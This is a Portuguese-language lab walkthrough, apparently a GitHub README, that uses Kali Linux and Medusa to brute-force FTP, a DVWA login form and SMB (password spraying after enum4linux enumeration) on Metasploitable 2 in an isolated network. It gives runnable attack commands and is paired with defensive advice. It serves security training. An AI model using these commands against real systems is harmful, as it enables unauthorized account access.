# Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux
O objetivo desse projeto é implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis, para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

# Ambientes 
Para a elaboração desse projeto foram utilizadas duas VMs (Kali Linux e Metasploitable 2) no Virtual Box, com rede interna (host-only). 

# Simulando um ataque de força bruta em FTP 
Para iniciarmos a simulação de ataque, precisamos primeiro, verificar se existe comunicação entre as duas máquinas virtuais, para isso utilizaremos o comando: 
     
      ping -c 3 192.168.56.101  

Sendo: 
1. "ping": utilitário que enviar ICMP Echo Request para um host e aguarda por um ICMP Echo Reply. Usado para testar conectividade de rede e latência;

   
2. "-c 3 (count = 3)": envia exatamente 3 pacotes ICMP e então termina;

   
3. "192.168.56.101": endereço IPv4 da máquina que sofrerá o ataque;

<img width="536" height="421" alt="image" src="https://github.com/user-attachments/assets/b95583bb-afca-4324-a9ce-0b5e18ad531b" />


Em caso de sucesso na comunicação, podemos verificar quais serviços estão disponíveis no sistema alvo, para isso iremos utilizar a ferramenta "nmap" que serve para escanear redes, identificar dispositivos conectados e encontrar portas abertas do sistema. Utilizaremos o seguinte comando:

     nmap -sV -p 21,22,80,445,139 192.168.56.101

Sendo:

1. "-sV": parâmetro uitlizado para identificar a versão do serviçoqu está rodando em cada porta;
   
2. "-p 21,22,80,445,139": portas comuns para os serviços FTP, SSH, HTTP e SMB;

Ao final do scan, deverá ser retornado uma saída indicando se existem, ou não, portas abertas e as versões do serviços.
<img width="531" height="423" alt="image" src="https://github.com/user-attachments/assets/8f998962-935c-42fa-a2a3-5745f96ad827" />

Com isso, podemos identificar que o serviço está ativo e que é possível acessá-lo, porém não sabemos qual o login e a senha. 
Para isso devemos criar listas com usuários e senhas comuns e utilizar a ferramenta "Medusa" para realizar um ataque de força bruta.
Para criarmos o arquivo com a lista de usuários e senha, utilizaresmo o comando:

Para os usuários:

     echo -e "user\msfadmin\nadmin\nroot" > users.txt

E para as senhas:

     echo -e "123456\npassword\nqwerty\msfadmin" > pass.txt

Assim que criado as listas, utilizaremos o seguinte comando:

     medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

O comando executa um ataque de força bruta/credential stuffing automatizado contra o serviço FTP do host, usando a lista de usuários "users.txt" e a lista de senhas "pass.txt" com 6 threads paralelas.

<img width="575" height="549" alt="image" src="https://github.com/user-attachments/assets/dda7147e-9c9c-4c24-95a2-525b5311b53b" />

Ao fim da execução é possível observar que o medusa obteve êxito utilizando as credenciais "msfadmin" e "msfadmin" para usuário e senha respectivamente. Isso significa que é possível acessar manualmente o serviço FTP.

     ftp 192.168.56.101

<img width="991" height="575" alt="image" src="https://github.com/user-attachments/assets/132c2e58-295e-46fb-8474-5eef6585f721" />

# Como defender um serviço FTP contra esse tipo de ataque?

1. Desabilitar FTP e usar SFTP/FTPS (FTP é antigo e inseguro).

2. Forçar senhas fortes e bloqueio após um número determinado de tentativas (fail2ban).

3. Limitar conexões por IP e implementar rate limiting.

4. Monitorar logs e usar SIEM para detectar padrões de brute force.

5. Usar autenticação por chave sempre que possível.

# Automação de tentativas em formulário web (DVWA)
Para essa simulação iremos realizar um ataque de força bruta em um formulário de um sistema web, através do Damn Vulnerable Web Application (DVWA) e a ferramenta medusa. Precisaremos também, criar wordlists para automatizar o ataque, através do comando:

Para usuários:

    echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

E para senhas: 

    echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

Agora utlizaremos o medusa para simular a combinação entre usuários e senhas, através do comando:

     medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
     -m PAGE:'/dvwa/login.php' \
     -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
     -m 'FAIL=Login failed' -t 6

Após a execução do comando, podemos verificar que o medusa obteve sucesso em algumas combinações de usuário e senha.
<img width="1260" height="618" alt="image" src="https://github.com/user-attachments/assets/691018e4-63d2-4836-a537-b5be052f1bad" />

# Password spraying em SMB com enumeração de usuários
A seguir simularemos um ataque de password spraying contra serviços SMB. O SMB (Server Message Block) é o protocolo utilizado pela Microsoft (e por implementações como Samba) para compartilhamento de arquivos e autenticação de contas. Ao invés de testar muitas senhas contra um único usuário, o password spraying testa um conjunto pequeno de senhas comuns contra múltiplos usuários para evitar detecção por bloqueios de conta. O objetivo desta simulação é identificar contas frágeis, observar artefatos de logs/alertas e validar medidas de mitigação em um ambiente de laboratório controlado.<br/>
Para começarmos, devemos enumerar os usuários, afim de confirmar quais são os usuários reais do sistema. Para isso iremos utilizar a ferramenta "enum4linux", através do comando:

    enum4linux -a 192.168.56.101 | tee enum4_output.txt

<img width="909" height="630" alt="image" src="https://github.com/user-attachments/assets/5f6a079d-00f0-4c9e-a84f-b0f2b354a540" />

Ao final da execução podemos encontrar algumas informações como nome do host, versão SMB suportada, usuários e contas, possíveis vulnerabilidades etc.

Utilizando o seguinte comando podemos listar os usuários encontrados:

    grep -i "User:" enum4_output.txt | sort -u
    
<img width="350" height="584" alt="image" src="https://github.com/user-attachments/assets/3c2ef8cd-ea0e-4199-acce-416a13865e71" />


Para darmos prosseguimento ao ataque, devemos criar uma wordlist para usuários e senhas.

    echo -e "user\nmsfadmin\nservice" > smb_users.txt

    echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

E para realizarmos de fato o ataque, utlizaremos o seguinte comando do medusa:

    medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

1. "-U smb_users.txt": lista de usuários encontrados;
2. "-P senhas_spray.txt": lista de senhas fracas;
3. "-M smbnt": módulo/serviço a ser atacado (aqui indica o módulo SMB/NTLM);

<img width="1127" height="230" alt="image" src="https://github.com/user-attachments/assets/f14f9722-c967-4110-9cab-ff283fc162ac" />

Após o fim da execução, é possível notar que o comando nos retornou, com sucesso, o usuário e senha com acesso real ao sistema. Para confirmar se o ataque foi um sucesso, iremos acessar o serviço smb, utilzando o comando:

    smbclient -L //192.168.56.101 -U msfadmin

Após digitarmos o usuário e senha encontrados anteriormente, podemos confirmar que o ataque foi bem sucedido.
<img width="657" height="270" alt="image" src="https://github.com/user-attachments/assets/34d1adef-df79-4cbe-a5fc-966f8de9516a" />

# Como se defender desse tipo de ataque?

Password spraying é um ataque silencioso e eficiente porque testa poucas senhas comuns contra muitos usuários, evitando gatilhos de bloqueio imediato. Segue abaixo algumas formas de se defender do ataque:

1. MFA obrigatória para contas sensíveis.

2. Rate limiting por IP e por usuário.

3. Detecção de padrões (credential stuffing / password spraying) no SIEM.

4. Verificação de senhas comprometidas (HaveIBeenPwned).

5. Backoff progressivo + desafios adaptativos (CAPTCHA)

    
